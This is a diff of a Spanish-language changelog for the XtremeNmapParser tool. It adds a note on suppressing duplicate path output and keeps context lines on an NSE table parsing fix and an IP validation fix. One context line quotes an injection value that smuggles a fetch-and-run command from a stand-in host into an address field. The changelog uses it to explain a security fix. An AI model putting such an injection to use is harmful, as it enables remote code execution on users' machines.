@@ -88,6 +88,12 @@ Versiones publicadas de [XNP](https://github.com/xtormin/XtremeNmapParser).
   `addr="10.0.0.1; curl evil.sh|sh"` es válido — y estos comandos están hechos
   para pegarse en una shell. Lo que no sea una dirección IP se descarta en vez
   de escaparse, tanto en Python como en JavaScript.
+- **Las rutas generadas ya no salen dos veces en el terminal.** La tabla de
+  *Ficheros generados* nombra cada fichero con su formato y su tamaño, y la
+  lista pelada de debajo repetía lo mismo con menos información. Esa lista es
+  para una tubería o una redirección, así que ahora se imprime solo cuando
+  stdout lo es — o cuando `--quiet` se ha llevado la tabla por delante.
+  `xnp -d nmap/ -oF csv > escritos.txt` sigue igual.
 - **Una tabla NSE anidada dentro de otra ya no tumba la ejecución.** El paso
   recursivo del parser se buscaba a sí mismo donde no estaba, así que cualquier
   `<script>` con una `<table>` dentro de otra —la salida corriente de
